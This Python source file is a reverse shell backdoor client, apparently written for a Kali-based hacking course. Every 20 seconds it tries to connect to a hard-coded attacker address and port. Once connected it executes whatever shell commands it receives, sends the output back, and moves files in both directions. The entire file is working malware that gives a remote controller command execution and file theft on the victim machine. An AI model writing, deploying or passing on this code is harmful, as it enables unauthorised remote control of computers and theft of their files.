import socket
import time
import subprocess
import json
import os

kali_ip = "192.168.0.8"
kali_port = 5555

def connection():
    while True:
        # sleeps 20 seconds
        time.sleep(20)
        try:
            # connect to destination addr
            sock.connect((kali_ip, kali_port))
            #executing the commands
            shell()
            sock.close()
        except: 
            connection()

def shell():
    while True: 
        # will receive the command that our server send
        command = reliable_receiv()
        if command == 'quit': 
            break
        #just check for the first 3 chars in command
        elif command[:3] == 'cd ':
            # cd Desktop should be "chdir(Desktop)" so we need to start after "cd "
            os.chdir(command[3:])
        elif command == 'clear':
            pass
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else: 
            execute = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def upload_file(filename): 
    f = open(filename, 'rb')
    sock.send(f.read())

def download_file(filename):
    f = open(filename, 'wb')
    # so that our program does not crash
    chunk = sock.recv(1024)
    sock.settimeout(1)
    while chunk: 
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()

def reliable_send(data):
    # data is our command and parses it to json
    jsonData = json.dumps(data)
    # send actual data, once sending data over sockets we need to encode it
    sock.send(jsonData.encode())

def reliable_receiv():
    data = ''
    while True:
        try:
            # byte we want to receive (1024) from our target
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

# to make a connection with IP (AF_INET) over TCP (SOCK_STREAM)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#trying to connect to target
connection()